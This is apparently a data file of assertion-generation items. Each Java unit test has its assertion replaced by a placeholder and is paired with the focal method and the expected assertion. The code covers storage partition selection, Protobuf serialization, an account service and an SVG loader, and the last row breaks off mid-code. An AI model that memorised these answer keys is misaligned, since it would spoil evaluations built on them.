"testPreferredDiskType() { LocalFileMapPartitionFactory partitionFactory = new LocalFileMapPartitionFactory(); String path1 = temporaryFolder1.getRoot().getAbsolutePath() + ""/""; String path2 = temporaryFolder2.getRoot().getAbsolutePath() + ""/"";  Properties properties = new Properties(); properties.setProperty( StorageOptions.STORAGE_LOCAL_DATA_DIRS.key(), String.format(""[SSD]%s,[HDD]%s"", path1, path2)); properties.setProperty(StorageOptions.STORAGE_PREFERRED_TYPE.key(), ""HDD""); partitionFactory.initialize(new Configuration(properties));  for (int i = 0; i < 100; ++i) { DataPartition dataPartition = partitionFactory.createDataPartition( StorageTestUtils.NO_OP_PARTITIONED_DATA_STORE, StorageTestUtils.JOB_ID, StorageTestUtils.DATA_SET_ID, StorageTestUtils.MAP_PARTITION_ID, StorageTestUtils.NUM_REDUCE_PARTITIONS); ""<AssertPlaceHolder>""; } }
createDataPartition( PartitionedDataStore dataStore, JobID jobID, DataSetID dataSetID, DataPartitionID dataPartitionID, int numReducePartitions) { CommonUtils.checkArgument(dataPartitionID != null, ""Must be not null.""); CommonUtils.checkArgument(dataPartitionID instanceof MapPartitionID, ""Illegal type."");  MapPartitionID mapPartitionID = (MapPartitionID) dataPartitionID; StorageMeta storageMeta = getNextDataStorageMeta(); if (storageMeta == null) { throw new RuntimeException(""No available healthy storage.""); } return new LocalFileMapPartition( storageMeta, dataStore, jobID, dataSetID, mapPartitionID, numReducePartitions); }"	assertEquals(path2, dataPartition.getPartitionMeta().getStorageMeta().getStoragePath())
"testSkipOverusedStorage() { LocalFileMapPartitionFactory partitionFactory = new LocalFileMapPartitionFactory(); String path1 = temporaryFolder1.getRoot().getAbsolutePath() + ""/""; String path2 = temporaryFolder2.getRoot().getAbsolutePath() + ""/""; String path3 = temporaryFolder3.getRoot().getAbsolutePath() + ""/"";  Configuration configuration = new Configuration(); configuration.setMemorySize( StorageOptions.STORAGE_MIN_RESERVED_SPACE_BYTES, MemorySize.ZERO); configuration.setMemorySize( StorageOptions.STORAGE_MAX_USABLE_SPACE_BYTES, MemorySize.parse(""1k"")); configuration.setString( StorageOptions.STORAGE_LOCAL_DATA_DIRS, String.format(""[HDD]%s"", path3)); partitionFactory.initialize(configuration);  StorageMeta storageMeta1 = new StorageMeta(path1, StorageType.SSD, ""storage1""); StorageMeta storageMeta2 = new StorageMeta(path2, StorageType.SSD, ""storage2""); storageMeta1.updateFreeStorageSpace(); storageMeta2.updateFreeStorageSpace(); partitionFactory.addSsdStorageMeta(storageMeta1); partitionFactory.addSsdStorageMeta(storageMeta2);  storageMeta1.updateUsedStorageSpace(2048); for (int i = 0; i < 1024; ++i) { ""<AssertPlaceHolder>""; } }
getNextDataStorageMeta() { switch (preferredStorageType) { case SSD: { StorageMeta ssdStorageMeta = getNextSsdStorageMeta(); if (ssdStorageMeta != null && ssdStorageMeta.getFreeStorageSpace() > minReservedSpaceBytes && ssdStorageMeta.getUsedStorageSpace() < maxUsableSpaceBytes) { return ssdStorageMeta; } StorageMeta hddStorageMeta = getNextHddStorageMeta(); if (hddStorageMeta != null && hddStorageMeta.getFreeStorageSpace() > minReservedSpaceBytes && hddStorageMeta.getUsedStorageSpace() < maxUsableSpaceBytes) { return hddStorageMeta; } return ssdStorageMeta != null ? ssdStorageMeta : hddStorageMeta; } case HDD: { StorageMeta hddStorageMeta = getNextHddStorageMeta(); if (hddStorageMeta != null && hddStorageMeta.getFreeStorageSpace() > minReservedSpaceBytes && hddStorageMeta.getUsedStorageSpace() < maxUsableSpaceBytes) { return hddStorageMeta; } StorageMeta ssdStorageMeta = getNextSsdStorageMeta(); if (ssdStorageMeta != null && ssdStorageMeta.getFreeStorageSpace() > minReservedSpaceBytes && ssdStorageMeta.getUsedStorageSpace() < maxUsableSpaceBytes) { return ssdStorageMeta; } return hddStorageMeta != null ? hddStorageMeta : ssdStorageMeta; } default: throw new ShuffleException(""Illegal preferred storage type.""); } }"	assertEquals(path2, partitionFactory.getNextDataStorageMeta().getStoragePath())
"testSkipStorageWithoutEnoughSpace() { LocalFileMapPartitionFactory partitionFactory = new LocalFileMapPartitionFactory(); String path1 = temporaryFolder1.getRoot().getAbsolutePath() + ""/""; String path2 = temporaryFolder2.getRoot().getAbsolutePath() + ""/""; String path3 = temporaryFolder3.getRoot().getAbsolutePath() + ""/"";  Configuration configuration = new Configuration(); configuration.setString( StorageOptions.STORAGE_LOCAL_DATA_DIRS, String.format(""[HDD]%s"", path3)); partitionFactory.initialize(configuration);  FakeStorageMeta storageMeta1 = new FakeStorageMeta(path1, StorageType.SSD); FakeStorageMeta storageMeta2 = new FakeStorageMeta(path2, StorageType.SSD); storageMeta1.updateFreeStorageSpace(1024); storageMeta2.updateFreeStorageSpace(Long.MAX_VALUE); partitionFactory.addSsdStorageMeta(storageMeta1); partitionFactory.addSsdStorageMeta(storageMeta2);  for (int i = 0; i < 1024; ++i) { ""<AssertPlaceHolder>""; } }
getNextDataStorageMeta() { switch (preferredStorageType) { case SSD: { StorageMeta ssdStorageMeta = getNextSsdStorageMeta(); if (ssdStorageMeta != null && ssdStorageMeta.getFreeStorageSpace() > minReservedSpaceBytes && ssdStorageMeta.getUsedStorageSpace() < maxUsableSpaceBytes) { return ssdStorageMeta; } StorageMeta hddStorageMeta = getNextHddStorageMeta(); if (hddStorageMeta != null && hddStorageMeta.getFreeStorageSpace() > minReservedSpaceBytes && hddStorageMeta.getUsedStorageSpace() < maxUsableSpaceBytes) { return hddStorageMeta; } return ssdStorageMeta != null ? ssdStorageMeta : hddStorageMeta; } case HDD: { StorageMeta hddStorageMeta = getNextHddStorageMeta(); if (hddStorageMeta != null && hddStorageMeta.getFreeStorageSpace() > minReservedSpaceBytes && hddStorageMeta.getUsedStorageSpace() < maxUsableSpaceBytes) { return hddStorageMeta; } StorageMeta ssdStorageMeta = getNextSsdStorageMeta(); if (ssdStorageMeta != null && ssdStorageMeta.getFreeStorageSpace() > minReservedSpaceBytes && ssdStorageMeta.getUsedStorageSpace() < maxUsableSpaceBytes) { return ssdStorageMeta; } return hddStorageMeta != null ? hddStorageMeta : ssdStorageMeta; } default: throw new ShuffleException(""Illegal preferred storage type.""); } }"	assertEquals(path2, partitionFactory.getNextDataStorageMeta().getStoragePath())
"Throwable { try (FileInputStream fis = new FileInputStream( ""src/test/resources/data_for_storage_compatibility_test/storageV0.meta""); DataInputStream dis = new DataInputStream(fis)) { LocalMapPartitionFileMeta fileMeta = LocalMapPartitionFileMeta.readFrom(dis); LocalMapPartitionFile partitionFile = new LocalMapPartitionFile(fileMeta, Integer.MAX_VALUE, false); int buffersRead = readData(partitionFile, 1); ""<AssertPlaceHolder>""; } }
readData(BufferQueue buffers, BufferRecycler recycler) throws Exception { CommonUtils.checkArgument(buffers != null, ""Must be not null.""); CommonUtils.checkArgument(recycler != null, ""Must be not null."");  CommonUtils.checkState(isOpened, ""Partition reader is not opened."");  boolean hasReaming = fileReader.hasRemaining(); boolean continueReading = hasReaming; long numBytes = 0; int numDataBuffers = 0;  while (continueReading) { ByteBuffer buffer = buffers.poll(); if (buffer == null) { break; }  try { continueReading = fileReader.readBuffer(buffer); } catch (Throwable throwable) { BufferUtils.recycleBuffer(buffer, recycler); throw throwable; }  hasReaming = fileReader.hasRemaining(); numBytes += buffer.remaining(); addBuffer(new Buffer(buffer, recycler, buffer.remaining()), hasReaming); ++numDataBuffers; }  if (numDataBuffers > 0) { notifyBacklog(numDataBuffers); }  if (!hasReaming) { closeReader(); }  if (numBytes > 0) { readingThroughputBytes.mark(numBytes); } return hasReaming; }"	assertEquals(10 * 10 * StorageTestUtils.NUM_REDUCE_PARTITIONS, buffersRead)
"Exception { LocalFileMapPartition dataPartition = createLocalFileMapPartition(); writeLocalFileMapPartition(dataPartition, 10, false, true);  for (File file : CommonUtils.checkNotNull(temporaryFolder.getRoot().listFiles())) { if (file.getPath().contains(LocalMapPartitionFile.INDEX_FILE_SUFFIX)) { Files.delete(file.toPath()); } } ""<AssertPlaceHolder>""; }
isConsumable() { return partitionFile.isConsumable(); }"	assertFalse(dataPartition.isConsumable())
"Exception { LocalFileMapPartition dataPartition = createLocalFileMapPartition(); writeLocalFileMapPartition(dataPartition, 10, false, true);  for (File file : CommonUtils.checkNotNull(temporaryFolder.getRoot().listFiles())) { if (file.getPath().contains(LocalMapPartitionFile.DATA_FILE_SUFFIX)) { Files.delete(file.toPath()); } } ""<AssertPlaceHolder>""; }
isConsumable() { return partitionFile.isConsumable(); }"	assertFalse(dataPartition.isConsumable())
"Exception { LocalMapPartitionFileMeta fileMeta = StorageTestUtils.createLocalMapPartitionFileMeta();  File tmpFile = temporaryFolder.newFile(); try (DataOutputStream output = new DataOutputStream(new FileOutputStream(tmpFile))) { fileMeta.writeTo(output); }  LocalMapPartitionFileMeta recovered; try (DataInputStream input = new DataInputStream(new FileInputStream(tmpFile))) { recovered = LocalMapPartitionFileMeta.readFrom(input); }  ""<AssertPlaceHolder>""; }
readFrom(DataInput dataInput) throws IOException { int storageVersion = dataInput.readInt(); return readFrom(dataInput, storageVersion); }"	assertEquals(fileMeta, recovered)
"Exception { int numBuffers = 4000; int bufferSize = 4096; Random random = new Random(); File file = temporaryFolder.newFile();  try (FileChannel fileChannel = FileChannel.open(file.toPath(), StandardOpenOption.WRITE)) { long totalBytes = 0; ByteBuffer[] buffers = new ByteBuffer[numBuffers]; for (int i = 0; i < numBuffers; ++i) { ByteBuffer buffer = CommonUtils.allocateDirectByteBuffer(random.nextInt(bufferSize) + 1); buffer.put(StorageTestUtils.DATA_BYTES, 0, buffer.capacity()); buffer.flip(); buffers[i] = buffer; totalBytes += buffer.capacity(); }  IOUtils.writeBuffers(fileChannel, buffers); ""<AssertPlaceHolder>""; } }
writeBuffers(FileChannel fileChannel, ByteBuffer[] buffers) throws IOException { CommonUtils.checkArgument(fileChannel != null, ""Must be not null.""); CommonUtils.checkArgument(buffers != null, ""Must be not null.""); CommonUtils.checkArgument(buffers.length > 0, ""No buffer to write."");  long expectedBytes = 0; for (ByteBuffer buffer : buffers) { expectedBytes += buffer.remaining(); }  long bytesWritten = fileChannel.write(buffers); while (bytesWritten < expectedBytes) { int bufferOffset = 0; for (ByteBuffer buffer : buffers) { if (buffer.hasRemaining()) { break; } ++bufferOffset; } bytesWritten += fileChannel.write(buffers, bufferOffset, buffers.length - bufferOffset); } return expectedBytes; }"	assertEquals(totalBytes, fileChannel.size())
"Exception { long startTime = System.nanoTime(); int numFailsFirstConnects = 2; ConnectionManager connMgr = createConnectionManager(numFailsFirstConnects); connMgr.start(); InetSocketAddress address = new InetSocketAddress(InetAddress.getLocalHost(), 0); connMgr.getChannel(new ChannelID(), address); connMgr.shutdown(); long duration = System.nanoTime() - startTime; long delay = connectionRetryWait.toNanos() * numFailsFirstConnects; String msg = String.format(""Retry duration (%d) < delay (%d)"", duration, delay); ""<AssertPlaceHolder>""; }
shutdown() { if (isShutdown) { return; } nettyClient.shutdown(); isShutdown = true; }"	assertTrue(msg, duration >= delay)
"Exception { int prevAvailableBuffers = transferBufferPool.numBuffers();  // Client sends ReadHandshakeRequest. client.connect(); client.open(); checkUntil(() -> serverHandler.isConnected());  // Close client. client.close(); ""<AssertPlaceHolder>""; }
close() throws IOException { LOG.debug( ""(remote: {}, channel: {}) Close for (dataSetID: {}, mapID: {}, startSubIdx: {}, endSubIdx: {})."", address, channelIDStr, dataSetID, mapID, startSubIdx, endSubIdx); if (closed.compareAndSet(false, true)) { if (nettyChannel != null) { connectionManager.releaseChannel(address, channelID); }  if (readClientHandler != null) { readClientHandler.unregister(this); } } }"	assertEquals(prevAvailableBuffers, transferBufferPool.numBuffers())
"testHadoopConfToMaps() { YarnConfiguration hadoopConf = new YarnConfiguration(); String testKey = ""a.b.test.key""; String testVal = ""a.b.test.val""; hadoopConf.set(testKey, testVal); Map<String, String> confMaps = DeployOnYarnUtils.hadoopConfToMaps(hadoopConf); ""<AssertPlaceHolder>""; }
hadoopConfToMaps( final org.apache.hadoop.conf.Configuration conf) { Map<String, String> confMaps = new HashMap<>(); for (Map.Entry<String, String> entry : conf) { confMaps.put(entry.getKey(), entry.getValue()); } return confMaps; }"	assertEquals(confMaps.get(testKey), testVal)
"IOException { // //        ProtobufRowDeserializationSchema ds = new ProtobufRowDeserializationSchema(Person.class); // //        Row row = ds.deserialize(this.b); // //        ProtobufRowSerializationSchema s = new ProtobufRowSerializationSchema(Person.class); // //        byte[] b = s.serialize(row); // //        Assert.""<AssertPlaceHolder>""; // //    }
deserialize(byte[] bytes) throws IOException { try { Message message = this.defaultInstance .newBuilderForType() .mergeFrom(bytes) .build(); return (Row) this.deserializationRuntimeConverter.convert(message); } catch (Exception e) { throw new IOException(""Failed to deserialize Protobuf message."", e); } }"	assertArrayEquals(this.b, b)
"IOException { // //        File file = new File(""./person.desc""); // //        FileInputStream fis = new FileInputStream(file); // //        byte[] descriptorBytes = new byte[(int) file.length()]; // //        fis.read(descriptorBytes); // //        ProtobufRowDeserializationSchema ds = new ProtobufRowDeserializationSchema(descriptorBytes); // //        Row row = ds.deserialize(this.b); // //        ProtobufRowSerializationSchema s = new ProtobufRowSerializationSchema(descriptorBytes); // //        byte[] b = s.serialize(row); // //        Assert.""<AssertPlaceHolder>""; // //    }
deserialize(byte[] bytes) throws IOException { try { Message message = this.defaultInstance .newBuilderForType() .mergeFrom(bytes) .build(); return (Row) this.deserializationRuntimeConverter.convert(message); } catch (Exception e) { throw new IOException(""Failed to deserialize Protobuf message."", e); } }"	assertArrayEquals(this.b, b)
"ClassNotFoundException { // //        ProtobufRowDeserializationSchema ds = new ProtobufRowDeserializationSchema(Person.class); // //        ByteArrayOutputStream bros = new ByteArrayOutputStream(); // //        ObjectOutputStream oos = new ObjectOutputStream(bros); // //        oos.writeObject(ds); // //        byte[] b = bros.toByteArray(); // //        ByteArrayInputStream bris = new ByteArrayInputStream(b); // //        ObjectInputStream ois = new ObjectInputStream(bris); // //        Object o = ois.readObject(); // //        Assert.""<AssertPlaceHolder>""; // //    }
writeObject(ObjectOutputStream outputStream) throws IOException { if (Objects.nonNull(this.messageClazz)) { outputStream.writeObject(this.messageClazz); } else { outputStream.writeObject(this.descriptorBytes); } }"	assertTrue(true)
"ClassNotFoundException { // //        File file = new File(""./person.desc""); // //        FileInputStream fis = new FileInputStream(file); // //        byte[] descriptorBytes = new byte[(int) file.length()]; // //        fis.read(descriptorBytes); // //        ProtobufRowDeserializationSchema ds = new ProtobufRowDeserializationSchema(descriptorBytes); // //        ByteArrayOutputStream bros = new ByteArrayOutputStream(); // //        ObjectOutputStream oos = new ObjectOutputStream(bros); // //        oos.writeObject(ds); // //        byte[] b = bros.toByteArray(); // //        ByteArrayInputStream bris = new ByteArrayInputStream(b); // //        ObjectInputStream ois = new ObjectInputStream(bris); // //        Object o = ois.readObject(); // //        Assert.""<AssertPlaceHolder>""; // //    }
writeObject(ObjectOutputStream outputStream) throws IOException { if (Objects.nonNull(this.messageClazz)) { outputStream.writeObject(this.messageClazz); } else { outputStream.writeObject(this.descriptorBytes); } }"	assertTrue(true)
"IOException { // //        ProtobufRowSerializationSchema s = new ProtobufRowSerializationSchema(Person.class); // //        byte[] b = s.serialize(this.r); // //        Person p1 = Person.parseFrom(b); // //        Assert.""<AssertPlaceHolder>""; // //    }
serialize(Row row) { try { // convert to message Message message = (Message) this.serializationRuntimeConverter.convert(row); return message.toByteArray(); } catch (Throwable e) { throw new RuntimeException(""Failed to serialize row."", e); } }"	assertEquals(p1, this.p)
"IOException { // //        File file = new File(""./person.desc""); // //        FileInputStream fis = new FileInputStream(file); // //        byte[] descriptorBytes = new byte[(int) file.length()]; // //        fis.read(descriptorBytes); // //        ProtobufRowSerializationSchema s = new ProtobufRowSerializationSchema(descriptorBytes); // //        byte[] b = s.serialize(this.r); // //        Person p1 = Person.parseFrom(b); // //        Assert.""<AssertPlaceHolder>""; // //    }
serialize(Row row) { try { // convert to message Message message = (Message) this.serializationRuntimeConverter.convert(row); return message.toByteArray(); } catch (Throwable e) { throw new RuntimeException(""Failed to serialize row."", e); } }"	assertEquals(p1, this.p)
"ClassNotFoundException { // //        ProtobufRowSerializationSchema s = new ProtobufRowSerializationSchema(Person.class); // //        ByteArrayOutputStream bros = new ByteArrayOutputStream(); // //        ObjectOutputStream oos = new ObjectOutputStream(bros); // //        oos.writeObject(s); // //        byte[] b = bros.toByteArray(); // //        ByteArrayInputStream bris = new ByteArrayInputStream(b); // //        ObjectInputStream ois = new ObjectInputStream(bris); // //        Object o = ois.readObject(); // //        Assert.""<AssertPlaceHolder>""; // //    }
writeObject(ObjectOutputStream outputStream) throws IOException { if (Objects.nonNull(this.messageClazz)) { outputStream.writeObject(this.messageClazz); } else { outputStream.writeObject(this.descriptorBytes); } }"	assertTrue(true)
"ClassNotFoundException { // //        File file = new File(""./person.desc""); // //        FileInputStream fis = new FileInputStream(file); // //        byte[] descriptorBytes = new byte[(int) file.length()]; // //        fis.read(descriptorBytes); // //        ProtobufRowSerializationSchema ds = new ProtobufRowSerializationSchema(descriptorBytes); // //        ByteArrayOutputStream bros = new ByteArrayOutputStream(); // //        ObjectOutputStream oos = new ObjectOutputStream(bros); // //        oos.writeObject(ds); // //        byte[] b = bros.toByteArray(); // //        ByteArrayInputStream bris = new ByteArrayInputStream(b); // //        ObjectInputStream ois = new ObjectInputStream(bris); // //        Object o = ois.readObject(); // //        Assert.""<AssertPlaceHolder>""; // //    }
writeObject(ObjectOutputStream outputStream) throws IOException { if (Objects.nonNull(this.messageClazz)) { outputStream.writeObject(this.messageClazz); } else { outputStream.writeObject(this.descriptorBytes); } }"	assertTrue(true)
"IOException { // //        ProtobufRowDataDeserializationSchema ds = new ProtobufRowDataDeserializationSchema( //                Person.class //                , true //                , null); // //        RowData rowData = ds.deserialize(this.b); // //        Assert.""<AssertPlaceHolder>""; // //    }
deserialize(byte[] bytes) throws IOException { if (bytes == null) { return null; } try {  Message message = this.defaultInstance .newBuilderForType() .mergeFrom(bytes) .build();  return (RowData) runtimeConverter.convert(message); } catch (Throwable t) { if (ignoreParseErrors) { return null; } throw new IOException( format(""Failed to deserialize Protobuf '%s'."", new String(bytes)), t); } }"	assertArrayEquals(this.b, b)
"IOException { // //        File file = new File(""./person.desc""); // //        FileInputStream fis = new FileInputStream(file); // //        byte[] descriptorBytes = new byte[(int) file.length()]; // //        fis.read(descriptorBytes); // //        ProtobufRowDeserializationSchema ds = new ProtobufRowDeserializationSchema(descriptorBytes); // //        Row row = ds.deserialize(this.b); // //        ProtobufRowSerializationSchema s = new ProtobufRowSerializationSchema(descriptorBytes); // //        byte[] b = s.serialize(row); // //        Assert.""<AssertPlaceHolder>""; // //    }
deserialize(byte[] bytes) throws IOException { if (bytes == null) { return null; } try {  Message message = this.defaultInstance .newBuilderForType() .mergeFrom(bytes) .build();  return (RowData) runtimeConverter.convert(message); } catch (Throwable t) { if (ignoreParseErrors) { return null; } throw new IOException( format(""Failed to deserialize Protobuf '%s'."", new String(bytes)), t); } }"	assertArrayEquals(this.b, b)
"ClassNotFoundException { // //        File file = new File(""./person.desc""); // //        FileInputStream fis = new FileInputStream(file); // //        byte[] descriptorBytes = new byte[(int) file.length()]; // //        fis.read(descriptorBytes); // //        ProtobufRowDeserializationSchema ds = new ProtobufRowDeserializationSchema(descriptorBytes); // //        ByteArrayOutputStream bros = new ByteArrayOutputStream(); // //        ObjectOutputStream oos = new ObjectOutputStream(bros); // //        oos.writeObject(ds); // //        byte[] b = bros.toByteArray(); // //        ByteArrayInputStream bris = new ByteArrayInputStream(b); // //        ObjectInputStream ois = new ObjectInputStream(bris); // //        Object o = ois.readObject(); // //        Assert.""<AssertPlaceHolder>""; // //    }
writeObject(ObjectOutputStream outputStream) throws IOException { if (Objects.nonNull(this.messageClazz)) { outputStream.writeObject(this.messageClazz); outputStream.writeObject(this.expectedResultType); } else { outputStream.writeObject(this.descriptorBytes); } }"	assertTrue(true)
"IOException { // //        ProtobufRowSerializationSchema s = new ProtobufRowSerializationSchema(Person.class); // //        byte[] b = s.serialize(this.r); // //        Person p1 = Person.parseFrom(b); // //        Assert.""<AssertPlaceHolder>""; // //    }
serialize(RowData element) { return new byte[0]; }"	assertEquals(p1, this.p)
"IOException { // //        File file = new File(""./person.desc""); // //        FileInputStream fis = new FileInputStream(file); // //        byte[] descriptorBytes = new byte[(int) file.length()]; // //        fis.read(descriptorBytes); // //        ProtobufRowSerializationSchema s = new ProtobufRowSerializationSchema(descriptorBytes); // //        byte[] b = s.serialize(this.r); // //        Person p1 = Person.parseFrom(b); // //        Assert.""<AssertPlaceHolder>""; // //    }
serialize(RowData element) { return new byte[0]; }"	assertEquals(p1, this.p)
"whenCreateAccountCalledWithValidRequest_itShouldReturnValidAccountDto() { CreateAccountRequest createAccountRequest = generateCreateAccountRequest(); Customer customer = generateCustomer(); Account account = generateAccount(createAccountRequest); AccountDto accountDto = generateAccountDto();  //Determine mock services behavior regarding test scenario Mockito.when(customerService.getCustomerById(""12345"")).thenReturn(customer); Mockito.when(accountRepository.save(account)).thenReturn(account); Mockito.when(accountDtoConverter.convert(account)).thenReturn(accountDto);  //Call the testing method AccountDto result = accountService.createAccount(createAccountRequest);  //Check results and verify the mock methods are called Assert.""<AssertPlaceHolder>""; Mockito.verify(customerService).getCustomerById(""12345""); Mockito.verify(accountRepository).save(account); Mockito.verify(accountDtoConverter).convert(account); }
createAccount(CreateAccountRequest createAccountRequest) { Customer customer = customerService.getCustomerById(createAccountRequest.getCustomerId());  if (customer.getId() == null || customer.getId().trim().equals("""")) { throw new CustomerNotFoundException(""Customer Not Found!""); }  Account account = Account.builder() .id(createAccountRequest.getId()) .balance(createAccountRequest.getBalance()) .currency(createAccountRequest.getCurrency()) .customerId(createAccountRequest.getCustomerId()) .city(createAccountRequest.getCity()) .build();  return accountDtoConverter.convert(accountRepository.save(account)); }"	assertEquals(result, accountDto)
"whenCreateAccountCalledWithNonExistCustomer_itShouldThrowRuntimeException() { CreateAccountRequest createAccountRequest = new CreateAccountRequest(""1234""); createAccountRequest.setCustomerId(""12345""); createAccountRequest.setBalance(100.0); createAccountRequest.setCity(City.ISTANBUL); createAccountRequest.setCurrency(Currency.TRY);  Mockito.when(customerService.getCustomerById(""12345"")).thenReturn(Customer.builder().build());  AccountDto expectedAccountDto = AccountDto.builder().build();  AccountDto result = accountService.createAccount(createAccountRequest);  Assert.""<AssertPlaceHolder>""; Mockito.verifyNoInteractions(accountRepository); Mockito.verifyNoInteractions(accountDtoConverter); }
createAccount(CreateAccountRequest createAccountRequest) { Customer customer = customerService.getCustomerById(createAccountRequest.getCustomerId());  if (customer.getId() == null || customer.getId().trim().equals("""")) { throw new CustomerNotFoundException(""Customer Not Found!""); }  Account account = Account.builder() .id(createAccountRequest.getId()) .balance(createAccountRequest.getBalance()) .currency(createAccountRequest.getCurrency()) .customerId(createAccountRequest.getCustomerId()) .city(createAccountRequest.getCity()) .build();  return accountDtoConverter.convert(accountRepository.save(account)); }"	assertEquals(result, expectedAccountDto)
"whenCreateAccountCalledWithWithEmptyCustomerId_itShouldThrowRuntimeException() { CreateAccountRequest createAccountRequest = new CreateAccountRequest(""1234""); createAccountRequest.setCustomerId(""12345""); createAccountRequest.setBalance(100.0); createAccountRequest.setCity(City.ISTANBUL); createAccountRequest.setCurrency(Currency.TRY);  Mockito.when(customerService.getCustomerById(""12345"")).thenReturn(Customer.builder() .id("" "") .build());  AccountDto expectedAccountDto = AccountDto.builder().build();  AccountDto result = accountService.createAccount(createAccountRequest);  Assert.""<AssertPlaceHolder>""; Mockito.verifyNoInteractions(accountRepository); Mockito.verifyNoInteractions(accountDtoConverter); }
createAccount(CreateAccountRequest createAccountRequest) { Customer customer = customerService.getCustomerById(createAccountRequest.getCustomerId());  if (customer.getId() == null || customer.getId().trim().equals("""")) { throw new CustomerNotFoundException(""Customer Not Found!""); }  Account account = Account.builder() .id(createAccountRequest.getId()) .balance(createAccountRequest.getBalance()) .currency(createAccountRequest.getCurrency()) .customerId(createAccountRequest.getCustomerId()) .city(createAccountRequest.getCity()) .build();  return accountDtoConverter.convert(accountRepository.save(account)); }"	assertEquals(result, expectedAccountDto)
"testToImage() { System.out.println(""SVGImageTest : testToImage""); URL url = this.getClass().getResource(""circle.svg""); SVGImage result = SVGLoader.load(url); Image img = result.toImage(); ""<AssertPlaceHolder>""; }
toImage() { SnapshotParameters params = SNAPSHOT_PARAMS; if (params == null) { params = new SnapshotParameters(); } WritableImage image = snapshotImpl(params); return image; }"	"assertNotNull(""Image must exist"", img)"
"IOException { System.out.println(""SVGImageTest : testSnapshot""); URL url = this.getClass().getResource(""circle.svg""); SVGImage result = SVGLoader.load(url); File file = File.createTempFile(""fxsvgimage"", ""png""); boolean isValid = result.snapshot(""png"", file); ""<AssertPlaceHolder>""; file.delete(); }
snapshot(String format, File file) throws SVGLibraryException { SnapshotParameters params = SNAPSHOT_PARAMS; if (params == null) { params = new SnapshotParameters(); params.setFill(Color.WHITE); } return snapshot(params, format, file); }"	"assertTrue(""File must exist"", isValid)"
"testParseStyle() { System.out.println(""SVGStyleBuilderTest : testParseStyle""); String content = "".st0{fill:#DEDEDE;} .st1{fill:#3E295E;} .st2{fill:#FFFFFF;} .st3{fill:#429946;} .st4{fill:#F5EB30;}""; Styles styles = SVGStyleBuilder.parseStyle(content, null); ""<AssertPlaceHolder>""; }
parseStyle(String content, Viewport viewport) { Matcher m = STYLES.matcher(content); Styles styles = null; while (m.find()) { if (styles == null) { styles = new Styles(); } String theRule = m.group(); int parIndex = theRule.indexOf('{'); String styleClass = theRule.substring(1, parIndex).trim(); Styles.Rule rule = new Styles.Rule(styleClass); boolean isEmpty = true; String ruleContent = theRule.substring(parIndex + 1, theRule.length() - 2).trim(); Matcher m2 = RULE_CONTENT.matcher(ruleContent); while (m2.find()) { if (isEmpty) { styles.addRule(rule); isEmpty = false; } String theProperty = m2.group(); int index = theProperty.indexOf(':'); String key = theProperty.substring(0, index).trim(); String value = theProperty.substring(index + 1, theProperty.length()).trim(); switch (key) { case FILL: { Color col = ParserUtils.getColor(value); rule.addProperty(key, Styles.FILL, col); break; } case STROKE: { Color col = ParserUtils.getColor(value); rule.addProperty(key, Styles.STROKE, col); break; } case STROKE_WIDTH: { double width = ParserUtils.parseLineWidth(value, viewport); rule.addProperty(key, Styles.STROKE_WIDTH, width); break; } case STROKE_DASHARRAY: { List<Double> list = ParserUtils.parseDashArray(value, viewport); if (list != null) { rule.addProperty(key, Styles.STROKE_DASHARRAY, list); } break; } case FONT_FAMILY: { String fontFamily = value.replace(""'"", """"); rule.addProperty(key, Styles.FONT_FAMILY, fontFamily); break; } case FONT_WEIGHT: { FontWeight fontWeight = SVGShapeBuilder.getFontWeight(value); rule.addProperty(key, Styles.FONT_WEIGHT, fontWeight); break; } case FONT_STYLE: { ExtendedFontPosture fontPosture = SVGShapeBuilder.getExtendedFontPosture(value); rule.addProperty(key, Styles.FONT_STYLE, fontPosture); break; } case FONT_SIZE: { double size = ParserUtils.parseFontSize(value); rule.addProperty(key, Styles.FONT_SIZE, size); break; } case TEXT_DECORATION: { rule.addProperty(key, Styles.TEXT_DECORATION, value); break; } case OPACITY: { double opacity = ParserUtils.parseOpacity(value); if (opacity >= 0) { rule.addProperty(key, Styles.OPACITY, opacity); } break; } case FILL_OPACITY: { double opacity = ParserUtils.parseOpacity(value); if (opacity >= 0) { rule.addProperty(key, Styles.FILL_OPACITY, opacity); } break; } case TRANSFORM: { List<Transform> transformList = TransformUtils.extractTransforms(value, viewport); if (!transformList.isEmpty()) { rule.addProperty(key, Styles.TRANSFORM, transformList); } break; } } } } return styles; }  public static MarkerContext setNodeStyle(Node node, XMLNode xmlNode, LoaderContext context, Viewport viewport) { return setNodeStyle(null, node, xmlNode, context, viewport); }  public static boolean hasFill(XMLNode xmlNode) { if (xmlNode.hasAttribute(FILL)) { return true; } else if (xmlNode.hasAttribute(CLIP_PATH)) { return true; } else if (xmlNode.hasAttribute(STYLE)) { String styles = xmlNode.getAttributeValue(STYLE); StringTokenizer tokenizer = new StringTokenizer(styles, "";""); while (tokenizer.hasMoreTokens()) { String style = tokenizer.nextToken();  StringTokenizer tokenizer2 = new StringTokenizer(style, "":""); String styleName = tokenizer2.nextToken().trim(); String styleValue = null; if (tokenizer2.hasMoreTokens()) { styleValue = tokenizer2.nextToken().trim(); } if (styleValue == null) { continue; }  switch (styleName) { case CLIP_PATH: return true; case FILL: return true; } } return false; } else { return false; } }  public static MarkerContext setNodeStyle(MarkerContext markerContext, Node node, XMLNode xmlNode, LoaderContext context, Viewport viewport) { MarkerContext markerContextR = null; Node contextNode = null; if (markerContext != null) { contextNode = markerContext.getContextNode(); } if (node instanceof Shape) { Shape shape = (Shape) node; if (markerContext == null) { markerContextR = MarkerBuilder.createMarkerContext(xmlNode, context); } if (xmlNode.hasAttribute(FILL)) { Paint fill = ParserUtils.expressPaint(contextNode, context.gradients, xmlNode.getAttributeValue(FILL)); shape.setFill(fill); if (markerContextR != null) { markerContextR.setContextFill(fill); } }  if (xmlNode.hasAttribute(STROKE)) { Paint stroke = ParserUtils.expressPaint(contextNode, context.gradients, xmlNode.getAttributeValue(STROKE)); shape.setStroke(stroke); if (markerContextR != null) { markerContextR.setContextStroke(stroke); } }  if (xmlNode.hasAttribute(STROKE_WIDTH)) { double strokeWidth = xmlNode.getLineWidthValue(STROKE_WIDTH, viewport, 1); shape.setStrokeWidth(strokeWidth); }  if (xmlNode.hasAttribute(STROKE_DASHARRAY)) { String dashArray = xmlNode.getAttributeValue(STROKE_DASHARRAY); applyDash(shape, dashArray, viewport); }  if (xmlNode.hasAttribute(STROKE_DASHOFFSET)) { String dashOffset = xmlNode.getAttributeValue(STROKE_DASHOFFSET); double offset = 